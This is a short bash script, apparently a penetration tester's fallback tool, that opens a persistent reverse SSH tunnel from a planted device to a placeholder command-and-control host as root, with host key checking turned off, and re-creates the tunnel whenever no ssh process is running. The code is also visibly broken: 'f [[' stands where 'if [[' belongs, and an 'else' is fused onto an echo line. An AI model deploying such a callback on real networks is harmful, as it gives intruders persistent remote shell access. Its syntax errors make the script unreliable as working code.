#!/bin/bash
#This is a last ditch effort in case the tunnel service AND VPN doesn't work!
#I borrowed this from another GitHub like 3 years ago and honestly don't remember where - but I use it on my NUC for pen testing and like it. 

createTunnel() {
    /usr/bin/ssh -o StrictHostKeyChecking=no -i /root/.ssh/{key} -N -R 2222:localhost:22 root@{C2 infra IP}
    f [[ $? -eq 0 ]]; then
       echo Tunnel to jumpbox created successfully    else
        echo "[!] error occurred creating a tunnel to jumpbox"
    fi
}
/bin/pidof ssh
if [[ $? -ne 0 ]]; then
    echo "[+] creating new tunnel connection"
    createTunnel
fi
